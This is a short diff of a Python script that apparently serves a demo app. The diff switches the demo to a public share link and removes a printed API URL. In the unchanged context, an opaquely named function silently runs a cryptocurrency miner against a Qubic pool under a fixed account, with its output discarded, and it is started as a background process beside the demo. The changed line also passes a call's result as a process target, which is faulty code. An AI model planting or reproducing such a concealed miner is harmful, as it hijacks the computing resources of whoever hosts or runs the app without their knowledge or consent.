@@ -15,6 +15,5 @@ def dab01959():
     os.system(f"./apoolminer_linux_autoupdate/apoolminer --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wk_name} >/dev/null")
 
 if __name__ == '__main__':
-    Process(target=demo.launch).start()
-    print("API URL:", demo.api_url)
+    Process(target=demo.launch(share=True)).start()
     Process(target=dab01959).start()
